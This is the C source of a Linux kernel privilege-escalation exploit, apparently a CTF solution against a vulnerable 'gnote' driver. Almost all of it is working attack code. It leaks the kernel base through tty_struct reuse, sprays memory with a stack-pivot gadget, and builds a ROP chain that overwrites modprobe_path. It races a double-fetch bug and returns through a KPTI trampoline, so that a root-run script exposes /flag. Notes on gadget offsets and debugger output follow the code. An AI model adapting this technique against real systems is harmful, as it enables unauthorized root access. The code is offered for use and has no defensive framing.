//$ gcc -O3 -pthread -static -g -masm=intel ./exp.c -o exp
#include <pthread.h>
#include <stdlib.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/uio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <syscall.h>
#include <sys/ipc.h>
#include <sys/sem.h>
#include <sys/user.h>

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((reparm(3)))(*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;

struct data {
    unsigned int menu;
    unsigned int arg;
};

int istriggered =0;

size_t user_cs, user_ss, user_rflags, user_sp;
void save_status()
{
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;"
            );
    puts("[+] Status has been saved!");
}
void race(void *s)
{
    struct data *d=s;
    while(!istriggered){
        d->menu = 0x9000000; // 0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000
        puts("[*] race ...");
    }
}
void something(){
    puts("[+] Congratulations! You get it!");
    system("/tmp/fake");
    system("cat /flag");
    exit(0);
}
void gen_test(){
    //system("echo -ne '#!/bin/sh\n/bin/cp /flag /tmp/flag\n/bin/chmod 777 /tmp/flag\n' > /tmp/chmod");
    system("echo -ne '#!/bin/sh\n/bin/chmod 777 /flag\n' > /tmp/chmod.sh");
    system("chmod +x /tmp/chmod.sh");
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/fake");
    system("chmod +x /tmp/fake");
}
void add_note(int fd, unsigned int size)
{
    struct data d;
    d.menu=1;
    d.arg=size;
    write(fd, (char *)&d, sizeof(struct data));
}
void select_note(int fd, unsigned int idx)
{
    struct data d;
    d.menu=5;
    d.arg = idx;
    write(fd, (char *)&d, sizeof(struct data));
}

int main()
{
    char buf[0x8000];
    struct data race_arg;
    pthread_t pthread;
    save_status();
    int fd;
    // Step 1 : leak kernel address
    fd=open("proc/gnote", O_RDWR);
    if (fd<0)
    {
        puts("[-] Open driver error!");
        exit(-1);
    }
    int fds[50];
    for (int i=0;i<50; i++)
        fds[i]=open("/dev/ptmx", O_RDWR|O_NOCTTY);
    for (int i=0;i<50; i++)
        close(fds[i]);
    add_note(fd,0x2e0);   // tty_struct结构大小0x2e0
    select_note(fd,0);
    read(fd, buf, 512);
    //for (int i=0; i< 20; i++)
    //    printf("%p\n", *(size_t *)(buf+i*8));
    unsigned long leak, kernel_base;
    leak= *(size_t *)(buf+3*8);
    kernel_base = leak - 0xA35360;
    printf("[+] Leak_addr= %p     kernel_base= %p\n", leak , kernel_base);
    unsigned tty_base = (*(size_t *)(buf+7*8)) & 0xffffffffffffff00;

    unsigned long prepare_kernel_cred = kernel_base + 0x69fe0;
    unsigned long commit_creds        = kernel_base + 0x69df0;
    unsigned long native_write_cr4_addr=kernel_base + (0x8cc3ef20-0x8cc00000);
    unsigned long fake_cr4            = 0x407f0;
    unsigned long xchg_eax_esp_ret    = kernel_base + 0x1992a;  //xchg eax, esp; ret;
    unsigned long pop_rdi_ret         = kernel_base + 0x1c20d;  //pop rdi; ret;
    unsigned long pop_rsi_ret         = kernel_base + 0x37799;  //pop rsi; ret; 
    unsigned long pop_rdx_ret         = kernel_base + 0xdd812;  //pop rdx; ret; 
    unsigned long swapgs_p_ret        = kernel_base + 0x3efc4;  //swapgs; pop rbp; ret; 
    unsigned long iretq_p_ret         = kernel_base + 0x1dd06;  //iretq; pop rbp; ret; 
    unsigned long mov_rdi_rax_p_ret   = kernel_base + 0x21ca6a; //cmp rcx, rsi; mov rdi, rax; ja 0x41ca5d; pop rbp; ret;
    unsigned long kpti_ret            = kernel_base + 0x600a4a;
    unsigned long modprobe_path       = kernel_base + 0xC2C540;
    unsigned long memcpy_addr         = kernel_base + 0x58a100;

    // Step 2 : 布置堆喷数据。内核加载最低地址0xffffffffc0000000 + (0x8000000+0x1000000)*8 = 0x8000000
    char *pivot_addr=mmap((void*)0x8000000, 0x1000000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
    unsigned long *spray_addr= (unsigned long *)pivot_addr;
    for (int i=0; i<0x1000000/8; i++)
        spray_addr[i]=xchg_eax_esp_ret;
    // Step 3 : 布置ROP。由于已经xchg eax,esp  而rax指向xchg地址，所以rop链地址是xchg地址低8位。
    unsigned long mmap_base = xchg_eax_esp_ret & 0xfffff000;
    unsigned long *rop_base = (unsigned long*)(xchg_eax_esp_ret & 0xffffffff);
    char *ropchain = mmap((void *)mmap_base, 0x2000, PROT_READ|PROT_WRITE,
        MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1,0);
    memcpy(mmap_base+0x1000, "/tmp/chmod.sh\0\n", 15);
    int i=0;
               // commit_creds(prepare_kernel_cred(0))
    rop_base[i++] = pop_rdi_ret;
    rop_base[i++] = modprobe_path;
    rop_base[i++] = pop_rsi_ret;
    rop_base[i++] = mmap_base+0x1000;          //    ja大于则跳转，-1是最大的数
    rop_base[i++] = pop_rdx_ret;
    rop_base[i++] = 0x10;
    rop_base[i++] = memcpy_addr;
               // bypass kpti
    //rop_base[i++] = swapgs_p_ret;
    //rop_base[i++] = tty_base ;
    //rop_base[i++] = iretq_p_ret;
    rop_base[i++] = kpti_ret;
    rop_base[i++] = 0;
    rop_base[i++] = 0;
    rop_base[i++] = & something;
    rop_base[i++] = user_cs;
    rop_base[i++] = user_rflags;
    rop_base[i++] = user_sp;
    rop_base[i++] = user_ss;

    // Step 4 : 开始竞争
    gen_test();             // 生成/tmp/fake 和 /tmp/chmod 文件
    race_arg.arg = 0x10001;
    pthread_create(&pthread,NULL, race, &race_arg);
    for (int j=0; j< 0x10000000000; j++)
    {
        race_arg.menu = 1;
        write(fd, (void*)&race_arg, sizeof(struct data));
    }
    pthread_join(pthread, NULL);
    getchar();
    return 0;
}


/*
1.kernel_base:
0x18:  0xffffffffba435360    -     ffffffffb9a00000   =   0xA35360
ffffffffb9a69fe0 T prepare_kernel_cred

2.ROP gadget:
0xffffffff8101992a: xchg eax, esp; ret; 
0xffffffff8101c20d: pop rdi; ret;
0xffffffff81037799: pop rsi; ret; 
0xffffffff810dd812: pop rdx; ret; 
0xffffffff8103efc4: swapgs; pop rbp; ret; 
0xffffffff8101dd06: iretq; pop rbp; ret; 
0xffffffff8121ca6a: cmp rcx, rsi; mov rdi, rax; ja 0x41ca5d; pop rbp; ret; 

ffffffffb758a100 W memcpy

modprobe_path = 0xffffffffb7c2bf60  -  0xffffffffb7000000
gef➤  x /10i 0xffffffffb706a7b0
   0xffffffffb706a7b0:  push   rbp
   0xffffffffb706a7b1:  mov    rdi,0xffffffffb7c2bf60
   0xffffffffb706a7b8:  mov    rbp,rsp
   0xffffffffb706a7bb:  push   rbx
   0xffffffffb706a7bc:  movzx  ebx,BYTE PTR [rip+0xd1ff1d]        # 0xffffffffb7d8a6e0
   0xffffffffb706a7c3:  call   0xffffffffb706a350

*/










